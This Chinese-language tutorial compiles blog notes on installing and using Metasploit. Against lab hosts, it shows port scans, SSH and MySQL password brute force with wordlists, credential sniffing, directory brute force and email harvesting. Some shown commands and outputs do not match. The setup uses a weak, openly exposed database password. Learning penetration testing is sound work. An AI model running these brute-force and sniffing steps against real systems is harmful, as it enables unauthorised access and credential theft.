# MetaSploit简介

Metasploit是一款开源安全漏洞检测工具，附带数百个已知的软件漏洞，并保持频繁更新。被安全社区冠以“可以黑掉整个宇宙”之名的强大渗透测试框架。

这种可以扩展的模型将负载控制(payload)、编码器(encode)、无操作生成器(nops)和漏洞整合在一起，使 Metasploit Framework 成为一种研究高危漏洞的途径。它集成了各平台上常见的溢出漏洞和流行的 shellcode ，并且不断更新。



Metasploit 渗透测试框架（MSF3.4）包含3功能模块：msfconsole、msfweb、msfupdate。msfupdate用于软件更新，建议使用前先进行更新，可以更新最新的漏洞库和利用代码。msfconsole 是整个框架中最受欢迎的模块，个人感觉也是功能强大的模块，所有的功能都可以该模块下运行。msfweb 是Metasploit framework的web组件支持多用户，是Metasploit图形化接口。



# 专业术语

## 1. Exploit_渗透攻击

攻击者利用一个安全漏洞所进行的**攻击行为**。流行的渗透攻击技术包括缓冲区溢出、Web应用程序漏洞攻击（如SQL注入），及利用配置错误等。

## 2. Payload_攻击载荷

是我们期望目标系统在**被渗透攻击之后**去执行的**代码**。

## 3. shellcode

在渗透攻击时作为攻击载荷运行的**一组机器命令**。shellcode通常以**汇编语言**编写。

## 4. Module_模块

一个模块是指Metasploit框架中所使用的**一段软件代码组件**。 比如说：渗透攻击模块（exploit module），辅助模块（auxiliary module）

## 5. Listener_监听器

等待被渗透主机连入网络的连接的组件



# Centos7安装metasploit

参考链接：CSDN：[Hua Tony](https://blog.csdn.net/weixin_50087571)：[Centos7.7安装metasploit](https://blog.csdn.net/weixin_50087571/article/details/108483367)

## 官网下载最新rpm包

```bash
wget https://rpm.metasploit.com/metasploit-omnibus/pkg/metasploit-framework-6.0.5%2B20200908102445~1rapid7-1.el6.x86_64.rpm
```


![在这里插入图片描述](https://img-blog.csdnimg.cn/20200909095851824.png#pic_center)

## 安装

```bash
yum install metasploit-framework-6.0.5+20200908102445~1rapid7-1.el6.x86_64.rpm
```

## 配置postgres数据库

参考链接：博客园：[低调的拉风](https://www.cnblogs.com/hign/) ：[centos 7 下metasploit安装以及配置数据库](https://www.cnblogs.com/hign/p/12118907.html)

首先使用docker安装postgres数据库。

```bash
docker run -d --name postgresql9.6 -e ALLOW_IP_RANGE=0.0.0.0/0 -e POSTGRES_USER=postgres -e POSTGRES_PASSWORD=postgres -v /var/minio/postgresql/data:/var/lib/postgresql/data -p 5432:5432 kartoza/postgis:9.6-2.4
```



### 创建用户和数据库并授权

```bash
create user msf with password 'postgres' nocreatedb;
create database msf1 with owner ='msf';
```

### 创建metasploit数据配置信息

```bash
vim /opt/metasploit-framework/database.yml
```

写入以下内容：

```xml
production:
 adapter: postgresql
 database: msf1
 username: msf
 password: postgres
 host: 127.0.0.1
 port: 5432
 pool: 75
 timeout: 5
```

### 使配置生效

```bash
echo export MSF_DATABASE_CONFIG=/opt/metasploit-framework/database.yml >> /etc/bashrc
source ~/.bashrc
```

## 启动控制台

进入到metasploit安装目录：`/opt/metasploit-framework/bin`启动控制台`msfconsole`。



![img](https://img2018.cnblogs.com/i-beta/1665977/201912/1665977-20191230113316464-834300791.png)

# MetaSploit教程（渗透测试框架）

参考链接：付杰博客：[Metasploit 教程（渗透测试框架）](https://www.fujieace.com/metasploit/tutorials.html)

## MetaSploit进行端口扫描

参考链接：博客园：[西戎](https://home.cnblogs.com/u/evilxr/)：[使用Metasploit进行端口扫描](https://www.cnblogs.com/evilxr/p/3840593.html)

[C0cho](https://choge.top/categories/Metasploit/)：[Metasploit分类](https://choge.top/categories/Metasploit/)

CSDN：[TravisZeng](https://blog.csdn.net/qq_34841823)：[metasploit](https://blog.csdn.net/qq_34841823/category_6514207.html)

[WEL测试](https://blog.csdn.net/henni_719)：[安全渗透测试学习笔记](https://blog.csdn.net/henni_719/category_7120009.html)

### 查看Metasploit框架提供的端口扫描工具：

```bash
msf > search portscan
 
Matching Modules
================
 
   Name                                              Disclosure Date  Rank    Description
   ----                                              ---------------  ----    -----------
   auxiliary/scanner/http/wordpress_pingback_access                   normal  Wordpress Pingback Locator
   auxiliary/scanner/natpmp/natpmp_portscan                           normal  NAT-PMP External Port Scanner
   auxiliary/scanner/portscan/ack                                     normal  TCP ACK Firewall Scanner
   auxiliary/scanner/portscan/ftpbounce                               normal  FTP Bounce Port Scanner
   auxiliary/scanner/portscan/syn                                     normal  TCP SYN Port Scanner
   auxiliary/scanner/portscan/tcp                                     normal  TCP Port Scanner
   auxiliary/scanner/portscan/xmas                                    normal  TCP "XMas" Port Scanner
```

### 使用Metasploit的SYN端口扫描器对单个主机进行一次简单的扫描：

```bash
msf > use scanner/portscan/syn
```

### 设定RHOST参数为192.168.119.132，线程数为50

```bash
RHOSTS => 192.168.119.132
msf  auxiliary(syn) > set THREADS 50
THREADS => 50
msf  auxiliary(syn) > run
 
[*]  TCP OPEN 192.168.119.132:80
[*]  TCP OPEN 192.168.119.132:135
[*]  TCP OPEN 192.168.119.132:139
[*]  TCP OPEN 192.168.119.132:1433
[*]  TCP OPEN 192.168.119.132:2383
[*]  TCP OPEN 192.168.119.132:3306
[*]  TCP OPEN 192.168.119.132:3389
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```







## MetaSploit进行SSH服务扫描

参考链接：CSDN：WEL测试：[使用Kali上的Metasploit获取ssh登录到靶机权限](https://blog.csdn.net/henni_719/article/details/88916095)



ssh服务常用端口为22：

```bash
msf6 auxiliary(scanner/telnet/telnet_version) > use auxiliary/scanner/ssh/ssh_version 
msf6 auxiliary(scanner/ssh/ssh_version) > show options

Module options (auxiliary/scanner/ssh/ssh_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    22               yes       The target port (TCP)
   THREADS  1                yes       The number of concurrent threads (max one per host)
   TIMEOUT  30               yes       Timeout for the SSH probe

msf6 auxiliary(scanner/ssh/ssh_version) > set RHOSTS 192.1.0.1
RHOSTS => 192.168.0.50
msf6 auxiliary(scanner/ssh/ssh_version) > set THREADS 50
THREADS => 50
msf6 auxiliary(scanner/ssh/ssh_version) > run

[+] 192.168.0.50:22       - SSH server version: SSH-2.0-OpenSSH_7.4 ( service.version=7.4 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH service.cpe23=cpe:/a:openbsd:openssh:7.4 service.protocol=ssh fingerprint_db=ssh.banner )
[*] 192.168.0.50:22       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ssh/ssh_version) > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > set THREADS 50
THREADS => 50
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME root
USERNAME => root
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /root/big.txt
PASS_FILE => /root/big.txt
msf6 auxiliary(scanner/ssh/ssh_login) > run
[-] Auxiliary failed: Msf::OptionValidateError One or more options failed to validate: PASS_FILE, RHOSTS.
msf6 auxiliary(scanner/ssh/ssh_login) > 
```


![img](https://img-blog.csdn.net/20170104144454407?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzQ4NDE4MjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)

再可以利用ssh_login模块进行SSH服务口令破解

![img](https://img-blog.csdn.net/20170104144558298?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzQ4NDE4MjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)

![img](https://img-blog.csdn.net/20170104144935647?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzQ4NDE4MjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)

通过暴力破解知道密码为ubuntu

![img](https://img-blog.csdn.net/20170104144630002?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzQ4NDE4MjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)



退出攻击，CTRL+C，查看会话列表：sessions -l

![img](https://img-blog.csdnimg.cn/20190330175742591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlbm5pXzcxOQ==,size_16,color_FFFFFF,t_70)

进入指定会话：sessions -i 1，进入到会话1，执行shell命令如下截图：

![img](https://img-blog.csdnimg.cn/20190330175742594.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlbm5pXzcxOQ==,size_16,color_FFFFFF,t_70)

![img](https://img-blog.csdnimg.cn/20190330175742597.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlbm5pXzcxOQ==,size_16,color_FFFFFF,t_70)

上述操作时通过，ssh_login模块获取到靶机的ssh会话信息，通过会话可以操作靶机上的信息，删除创建文件等。





## MetaSploit进行FTP服务扫描



## 使用MSF生成木马实现远程控制服务器



## 利用Metasploit获取mysql弱口令

参考链接：CSDN：WEL测试：[使用Kali上的Metasploit进行获取mysql登录密码信息](https://blog.csdn.net/henni_719/article/details/88915597)

### 查询mysql服务相关模块信息：

```bash
search mysql
```

### 选择mysql_login模块：

```
use  auxiliary/scanner/mysql/mysql_login
```

![img](https://img-blog.csdnimg.cn/20190330172801668.png)

### 查看mysql_login配置选项信息：

```
show options
```

![img](https://img-blog.csdnimg.cn/20190330172801670.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlbm5pXzcxOQ==,size_16,color_FFFFFF,t_70)

### 设置RHOSTS参数为靶机IP：

```
set RHOSTS 192.168.88.137
```

![img](https://img-blog.csdnimg.cn/20190330172801827.png)

### 设置用户名字典，使用系统字典，也可以指定自己创建的用户字典：

```
set USER_FILE /usr/share/metasploit-framework/data/wordlists/mirai_user.txt
```

![img](https://img-blog.csdnimg.cn/20190330172801674.png)

### 设置密码字典，使用系统字典，也可以指定自己创建的密码字典：

```
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/mirai_pass.txt
```

![img](https://img-blog.csdnimg.cn/20190330172801679.png)

### 执行攻击：

```
exploit
```

![img](https://img-blog.csdnimg.cn/20190330172801696.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlbm5pXzcxOQ==,size_16,color_FFFFFF,t_70)

![img](https://img-blog.csdnimg.cn/20190330172801699.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlbm5pXzcxOQ==,size_16,color_FFFFFF,t_70)

获取用户名为root，用户为root，与初始设置的mysql值一致，至此成功获取mysql的root用户的登录权限。



## Telnet服务扫描

telnet服务的常用端口是23：

```bash
msf > use auxiliary/scanner/telnet/telnet_version

msf auxiliary(telnet_version) > show options

msf auxiliary(telnet_version) > set RHOSTS 10.10.10.254
RHOSTS => 10.10.10.254
msf auxiliary(telnet_version) > set THREADS 50
THREADS => 50
msf auxiliary(telnet_version) > run
```

![img](https://img-blog.csdn.net/20170104144242857?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzQ4NDE4MjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)



## pnsuffle口令嗅探

可以截获常见协议的身份认证过程，并将用户名和口令信息记录下来。

```bash
msf6 auxiliary(scanner/ssh/ssh_login) > use auxiliary/sniffer/psnuffle 
msf6 auxiliary(sniffer/psnuffle) > show options

Module options (auxiliary/sniffer/psnuffle):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   FILTER                      no        The filter string for capturing traffic
   INTERFACE                   no        The name of the interface
   PCAPFILE                    no        The name of the PCAP capture file to process
   PROTOCOLS  all              yes       A comma-delimited list of protocols to sniff or "all".
   SNAPLEN    65535            yes       The number of bytes to capture
   TIMEOUT    500              yes       The number of seconds to wait for new data


Auxiliary action:

   Name     Description
   ----     -----------
   Sniffer  Run sniffer


msf6 auxiliary(sniffer/psnuffle) > run
[*] Auxiliary module running as background job 0.
msf6 auxiliary(sniffer/psnuffle) > 
[*] Loaded protocol FTP from /opt/metasploit-framework/embedded/framework/data/exploits/psnuffle/ftp.rb...
[*] Loaded protocol IMAP from /opt/metasploit-framework/embedded/framework/data/exploits/psnuffle/imap.rb..
```


![img](https://img-blog.csdn.net/20170104145522181?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzQ4NDE4MjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)

![img](https://img-blog.csdn.net/20170104145547234?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzQ4NDE4MjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)

可以看到，嗅探到FTP服务10.10.10.129链接到10.10.10.254的用户名和密码



## 代理服务器探测

当如果靶机开启了代理服务器来隐藏自己身份的时候，我们使用auxiliary/scanner/http/open_proxy，可以探测到代理服务器的使用



## 网站目录扫描

借助metasploit中的brute_dir,dir_listing,dir_scanner等辅助模块来完成，主要使用暴力破解的方式工作。

![img](https://img-blog.csdn.net/20170104104341046?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzQ4NDE4MjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)

可以看到，在这个testfire.net中存在有几个隐藏目录（返回代码403：没有权限访问）

## 搜集特定地址的邮件地址

search_email_collector
要求提供一个邮箱后缀，通过多个搜索引擎的查询结果分析使用此后缀的邮箱地址，可以很方便的获得大量邮件地址。

![img](https://img-blog.csdn.net/20170104104714566?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzQ4NDE4MjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)

## 主机探测和端口扫描

- 使用metasploit中的modules/auxiliary/scanner/discovery中的arp_sweep或者udp_sweep

arp_sweep使用ARP请求美剧本地局域网中的所有活跃主机

udp_sweep通过发送UDP数据包探查制定主机是否活跃，并发现主机上的UDP服务

![img](https://img-blog.csdn.net/20170104105359588?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzQ4NDE4MjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)

- 使用nmap工具来探测

默认参数下，nmap使用发送ICMP请求来探测存活主机（即-sP选项）

![img](https://img-blog.csdn.net/20170104105620714?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzQ4NDE4MjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)

如果是在INTERNET环境中，则应该使用-Pn选项，不要使用ICMP ping扫描，因为ICMP数据包通常无法穿透Internet上的网络边界；还可以使用-PU通过对开放的UDP端口进行探测以确定存活的主机。

可以使用-O选项辨识目标主机的操作系统；再加以-sV选项辨识操作系统中运行的服务的类型信息

![img](https://img-blog.csdn.net/20170104110105992?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzQ4NDE4MjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)

## 端口扫描与服务类型探测

利用nmap或者metasploit中的auxiliary/scanner/portscan中的扫描器进行端口扫描

![img](https://img-blog.csdn.net/20170104111008176?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzQ4NDE4MjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)

ack：通过ACK扫描的方式对防火墙上未被屏蔽的端口进行探测；

ftpbounce：通过FTP BOUNCE攻击的原理对TCP服务进行枚举

syn：使用发送TCP SYN标志的方式探测开放的端口

tcp：通过一次完整的TCP链接来判断端口是否开放

xmas：一种更为隐蔽的扫描方式，通过发送FIN,PSH,URG标志能够躲避一些TCP标记检测器的过滤

![img](https://img-blog.csdn.net/20170104112244194?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzQ4NDE4MjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)

常用nmap扫描类型参数：

-sT:TCP connect扫描

-sS:TCP syn扫描

-sF/-sX/-sN:通过发送一些标志位以避开设备或软件的检测

-sP:ICMP扫描

-sU:探测目标主机开放了哪些UDP端口

-sA:TCP ACk扫描

扫描选项：

-Pn:在扫描之前，不发送ICMP echo请求测试目标是否活跃

-O:辨识操作系统等信息

-F:快速扫描模式

-p<端口范围>：指定端口扫描范围

![img](https://img-blog.csdn.net/20170104112403710?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzQ4NDE4MjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)

![img](https://img-blog.csdn.net/20170104112456664?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzQ4NDE4MjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)